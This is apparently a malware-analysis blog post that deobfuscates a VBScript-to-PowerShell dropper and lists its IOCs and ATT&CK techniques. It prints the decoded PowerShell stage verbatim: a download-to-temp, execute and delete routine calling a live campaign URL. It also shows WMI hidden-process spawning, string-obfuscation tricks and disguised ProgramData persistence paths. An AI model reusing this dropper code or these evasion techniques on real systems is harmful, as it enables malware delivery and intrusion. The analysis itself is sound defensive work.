---
layout: post
title: "Multi-Stage Dropper Analysis: VBScript to PowerShell"
date: 2026-02-01
categories: [ malware ]
permalink: /malware/vbscript-dropper-analysis/
tags: [malware-analysis, vbscript, powershell, obfuscation, cyberchef, homelab]
image: assets/images/malware/vbscript-dropper/20-cyberchef-success.png
---

Came across a multi-stage dropper that chains VBScript and PowerShell with several layers of obfuscation. The sample originated from an active campaign hosting content on `terazosine.fit`. I wanted to work through the deobfuscation manually rather than just running it. Wanted to understand exactly what techniques were being used and how they fit together.

This turned out to be more of a journey than I expected. Lots of false starts and dead ends before getting clean output.

## Sample Overview

| | |
|---|---|
| **Initial Vector** | HTML file with embedded VBScript |
| **Stage 1** | Obfuscated VBScript using WMI for execution |
| **Stage 2** | PowerShell dropper with persistence mechanisms |
| **C2 Domain** | terazosine.fit |

## Stage 1: VBScript Analysis

Opened the sample in Notepad++ and immediately ran JSFormat from the Plugins menu to clean up the structure. The raw file was a mess of concatenated strings and weird variable names. After formatting, at least I could see the code structure.

![Notepad++ with JSFormat](/assets/images/malware/vbscript-dropper/01-decoder-functions.png)

First thing I tried was searching for common VBScript execution methods. Searched for `Execute`, `Eval`, `Run`, `Shell` but came up empty. No obvious execution patterns.

Then I searched for `GetObject` and got a hit. This is how the malware calls out to WMI for execution:

![GetObject Found](/assets/images/malware/vbscript-dropper/09-getobject-found.png)

Found the execution mechanism, but the actual commands being executed were all obfuscated. Time to figure out the decoder functions.

### Finding the Decoder Functions

Searched for "Function" in Notepad++ and found 15 hits. Most of these were the actual decoder functions used to deobfuscate the payload strings. Four functions stood out as the core decoding chain:

| Function | What I figured out it does |
|----------|---------------------------|
| `RWYGDTJTOHTCVIJCTKNJXY` | ASCII shift (subtract 1 from each character) |
| `LOOIMKHOROIYNCTVGPKNGC` | String reversal (the XOR operations cancel each other out) |
| `PIBCVBCJVWQYLJMSLLGTXM` | Hex decode plus XOR with a key |
| `WBSWDTGSJCVPTRBKRAJRUO` | Array lookup using Case statements |

### The ASCII Shift Function

This one was pretty straightforward to understand. Loops through each character, gets the ASCII value with `Asc()`, subtracts 1, then converts back to a character with `Chr()`:

![ASCII Shift Function Code](/assets/images/malware/vbscript-dropper/02-ascii-shift-function.png)

The function signature shows it takes one argument `ZKZYHSEQCVBGENDTEVRYIL` and builds up a return string character by character. Classic Caesar cipher with a shift of 1.

### The String Reversal Function

This one looked more complicated at first because it has XOR operations in it:

![Reversal Function](/assets/images/malware/vbscript-dropper/13-reversal-function.png)

But after staring at it for a while, I realized the XOR operations completely cancel out. It XORs a value, then XORs it again with the same key. `A XOR B XOR B = A`. So all this function actually does is reverse the string. The XOR is just there to make it look more complex than it is.

### The Hex Decode Function

This is where things got interesting. The function takes two arguments and does hex decoding plus XOR:

![Hex XOR Function](/assets/images/malware/vbscript-dropper/14-hex-xor-function.png)

It reads hex pairs from the input, converts them to bytes, then XORs each byte with a character from the key. The key cycles through if the input is longer than the key.

### The Array Lookup Function

The fourth function uses a Select Case statement to map index values to encoded property values:

![Array Lookup Function](/assets/images/malware/vbscript-dropper/12-array-lookup-function.png)

So `WBSWDTGSJCVPTRBKRAJRUO(2)` returns the encoded value stored in Case 2, which is one of the hex strings stored in the object properties.

### Finding the Encoded Payloads

The actual encoded strings were stored as properties on a custom object. Searching for the object name showed all the assignments:

![Encoded Payloads](/assets/images/malware/vbscript-dropper/04-encoded-payloads.png)

Noticed something weird here. The hex strings contained characters that aren't valid hex: colons (`:`) and the letter `g`. These get stripped out or handled specially during decoding. Another layer of obfuscation to make automated decoding harder.

## CyberChef: The Struggle

Now I had to actually decode these strings. Figured CyberChef would make quick work of it. I was wrong. This part took way longer than it should have.

### First Attempt: Decoding the XOR Key

The XOR key was stored as `EMTJSDDRKIFGIKQWNIMD` and needed to be decoded through the ASCII shift function first. So I dropped it into CyberChef with an ADD operation set to -1.

First try with HEX mode selected:

![CyberChef HEX Wrong](/assets/images/malware/vbscript-dropper/10-cyberchef-hex-wrong.png)

Output was `FNUKTEESLJGHJLRXOJNE`. That's clearly wrong because it shifted UP by 1 instead of down. The function subtracts 1, so I need to ADD -1. But with HEX selected, the -1 was being interpreted incorrectly.

Switched the dropdown from HEX to DECIMAL:

![CyberChef DECIMAL Correct](/assets/images/malware/vbscript-dropper/11-cyberchef-decimal-correct.png)

Output: `DLSIRCCQJHEFHJPVMHLC`. That looked right. Made a note of the decoded XOR key:

![Notes with XOR Key](/assets/images/malware/vbscript-dropper/15-notes-xor-key.png)

### Building the Full Recipe

Now I needed to chain all the operations together. The encoding chain was:
1. XOR with key
2. To Hex
3. Reverse (after the first character manipulation)
4. ADD +1 to each character
5. Reverse again

So to decode, I need to reverse that: Reverse, ADD -1, Reverse, From Hex, XOR.

First attempt at the full recipe. Got garbage:

![CyberChef Wrong Order](/assets/images/malware/vbscript-dropper/16-cyberchef-wrong-order.png)

The output was showing control characters and random symbols. Clearly not right.

Tried rearranging the operations. Still garbage:

![CyberChef Still Garbage](/assets/images/malware/vbscript-dropper/18-cyberchef-still-garbage.png)

At this point I was getting frustrated. Went back and traced through the VBScript code again step by step.

### What I Was Getting Wrong

The problem was I was thinking about the encoding in the wrong order. Looking at how the functions are called:

```
PIBCVBCJVWQYLJMSLLGTXM(LOOIMKHOROIYNCTVGPKNGC(RWYGDTJTOHTCVIJCTKNJXY(...)))
```

The innermost function runs first. So the encoding order is:
1. `RWYGDTJTOHTCVIJCTKNJXY` runs first (ASCII shift: ADD +1)
2. `LOOIMKHOROIYNCTVGPKNGC` runs second (Reverse)
3. `PIBCVBCJVWQYLJMSLLGTXM` runs third (Hex + XOR)

So the data transformation is: original → shifted up by 1 → reversed → hex encoded with XOR.

To decode, I need to undo that in reverse order:
1. XOR and From Hex (undo step 3)
2. Reverse (undo step 2)
3. ADD -1 (undo step 1)

But wait. Looking at the actual encoded strings, they have an extra reverse applied. So the full decode order needed to be:

1. Reverse
2. ADD -1 (DECIMAL)
3. Reverse
4. From Hex
5. XOR with decoded key

Tried different orderings:

![Another Wrong Order](/assets/images/malware/vbscript-dropper/19-cyberchef-wrong-order2.png)

Still not working. The XOR was in the wrong position.

### Finally Getting It Right

After more trial and error, I figured out the correct recipe:

![CyberChef Success](/assets/images/malware/vbscript-dropper/20-cyberchef-success.png)

**Output:** `winmgmts:{impersonationLevel=impersonate,authenticationLevel=pktPrivacy}!\`

That's the WMI connection string. Finally making progress.

The working recipe:
1. Reverse (Character)
2. ADD -1 (DECIMAL)
3. Reverse (Character)
4. From Hex
5. XOR with key `DLSIRCCQJHEFHJPVMHLC`

### Decoded WMI Execution

Running all the encoded strings through the recipe, I built up the complete picture of what the malware does:

![Decoded Output](/assets/images/malware/vbscript-dropper/05-decoded-wmi-dropper.png)

The VBScript uses WMI to spawn a hidden PowerShell process:

```
winmgmts:{impersonationLevel=impersonate,authenticationLevel=pktPrivacy}!\
Win32_ProcessStartup
Win32_Process
.ShowWindow = 0
.Create()
```

Key components:
- `impersonationLevel=impersonate` means it can impersonate the client's security context
- `authenticationLevel=pktPrivacy` encrypts the WMI traffic
- `ShowWindow = 0` hides the window
- `.Create()` spawns the process

The author put thought into the privilege handling here. Using impersonation and packet privacy isn't something you see in quick and dirty scripts.

### The Base64 Payload

The PowerShell command used `-ExecutionPolicy Bypass -EncodedCommand` followed by Base64. Decoded with UTF-16LE (standard for PowerShell encoded commands):

```powershell
$url='https://terazosine.fit/NKLZHRSXAPCIQHNBLSOV'
$NYXDDXXNNFIBJRBAQPTVZI = Join-Path ([System.IO.Path]::GetTempPath()) 'NYXDDXXNNFIBJRBAQPTVZI'
$JYQGBUBSINFEGPWOEVMKSU = Join-Path $NYXDDXXNNFIBJRBAQPTVZI 'TLGQKFDYDJZAQZHJDWCCVR.ps1'
$EKHBJJXVXCQPGVRMWEHRVZ = (iwr $url -UseBasicParsing).Content
New-Item -ItemType Directory -Path $NYXDDXXNNFIBJRBAQPTVZI -Force
$EKHBJJXVXCQPGVRMWEHRVZ | Out-File -FilePath $JYQGBUBSINFEGPWOEVMKSU
& $JYQGBUBSINFEGPWOEVMKSU
Remove-Item -Path $JYQGBUBSINFEGPWOEVMKSU -Force
Remove-Item -Path $NYXDDXXNNFIBJRBAQPTVZI -Force
```

Standard dropper pattern: download to temp directory, execute, delete evidence.

## Stage 2: PowerShell Dropper

Fetched the second stage payload (178KB) and transferred it to the isolated FLARE VM. Had to go through Proxmox to get the file onto the airgapped VM. Different obfuscation format than stage 1 which meant different decoding approach.

### Character Index Array Obfuscation

The first technique I noticed was building strings by indexing into a scrambled character array:

![PowerShell Index Arrays](/assets/images/malware/vbscript-dropper/06-powershell-index-decode.png)

```powershell
("OHbM8XB2e-cGYqyRtK1AUwJEufPL79mDsvTg6V1Sh0Crka4ZNnp3jWxiIozFd5Q")[34,8,32,16,9,26,45,16,40] -join ''
```

Ran this directly in PowerShell on the isolated VM to decode it. Output: `Test-Path`

Found several more of these and decoded them all:

| Obfuscated | Decoded |
|------------|---------|
| Index array #1 | `Test-Path` |
| Index array #2 | `New-Item` |
| Index array #3 | `start-sleep` |

### ASCII Math Obfuscation

Some single characters were built through arithmetic:

```powershell
[char](86 - 19)  # = [char](67) = 'C'
[char](117 - 59) # = [char](58) = ':'
```

These built up a path character by character: `C:\ProgramData\...`

### The Decoy String Technique

This was the clever one. Large blocks of security-themed text that look like comments or documentation:

![Substring Obfuscation](/assets/images/malware/vbscript-dropper/08-substring-obfuscation.png)

```powershell
$YDTWTCAWMMHEIOF = "Hashing, a core concept in cryptography, is used to verify data integrity..."
$WVYFQANABLXCBEIHIWV = $YDTWTCAWMMHEIOF.Substring(86, 1)
```

The trick is that the text contains intentional typos and weird capitalization. For example, "Multi-faCtor" with a capital C. The script extracts specific characters at specific positions to build up commands.

If you're just skimming the code, you might think these are legitimate comments about security concepts. Nice trick.

### Persistence Mechanism

The dropper creates a bunch of directories in `C:\ProgramData\` that look like legitimate Microsoft paths:

![Persistence Paths](/assets/images/malware/vbscript-dropper/07-persistence-paths.png)

Directories created:
- `C:\ProgramData\OneAuth\Microsoft\PackagedEventProviders\DeliveryOptimization\...`
- `C:\ProgramData\PackageCache\Microsoft\INetCache\PackagedEventProviders\...`
- `C:\ProgramData\Local\MicrosoftWindows.Client\...`
- `C:\ProgramData\DeliveryCurrentControlSet\SessionManager\Optimization\...`

These path names are designed to blend in. Uses real Microsoft folder names like `OneAuth`, `PackageCache`, `DeliveryOptimization` in combinations that look plausible but don't actually exist on a clean system.

The execution flow:
1. Download a decoy `Password.txt` file from the C2 and open it (distraction for the user)
2. Sleep 5 seconds (let the decoy window grab focus)
3. Check if persistence directories exist with `Test-Path`
4. Create them if missing with `New-Item`
5. Prepare to drop the actual payload

## IOCs

**URLs:**
- `hxxps://terazosine[.]fit/LAQVLANAMIKWWFMEZJVV` (Stage 1)
- `hxxps://terazosine[.]fit/NKLZHRSXAPCIQHNBLSOV` (Stage 2)
- `hxxps://terazosine[.]fit/VIFLAIEPJXVSSVDEWHXT` (Password.txt decoy)

**Persistence Paths:**
- `C:\ProgramData\OneAuth\Microsoft\PackagedEventProviders\`
- `C:\ProgramData\PackageCache\Microsoft\INetCache\`
- `C:\ProgramData\DeliveryCurrentControlSet\`

**MITRE ATT&CK:**

| ID | Technique |
|----|-----------|
| T1059.001 | PowerShell |
| T1059.005 | Visual Basic |
| T1047 | Windows Management Instrumentation |
| T1027 | Obfuscated Files or Information |
| T1036.005 | Match Legitimate Name or Location |

## Tooling

- CyberChef for VBScript deobfuscation
- PowerShell on isolated VM for decoding index arrays
- Notepad++ with VBScript syntax highlighting
- Isolated FLARE VM (192.168.100.110) for Stage 2 analysis

## Lessons Learned

The CyberChef struggles taught me something. When you're reversing an encoding chain, you can't just think about what operations were applied. You have to trace through exactly how the functions are called and in what order. The nested function calls in VBScript (`func1(func2(func3(...)))`) execute from the inside out, which means the innermost function runs first on the plaintext.

I kept getting garbage output because I was applying the decoding operations in the wrong order. Had to literally draw out the data flow to get it right.

The multi-layer obfuscation isn't doing anything novel. ASCII shifts, XOR, hex encoding, string reversal. All basic techniques. But chaining them together and storing the key in an obfuscated form too makes the manual analysis tedious. Automated tools might handle each layer fine but get tripped up by the non-standard hex characters (`:` and `g`) mixed into the encoded strings.

The decoy strings in Stage 2 using security terminology ("Hashing, a core concept in cryptography...") was a nice touch. Makes the code look more legitimate at first glance.

Would like to see what the final payload does after establishing persistence, but the C2 was already down by the time I got around to the analysis.

---

*Analysis performed on isolated FLARE VM. IOCs defanged for safety.*
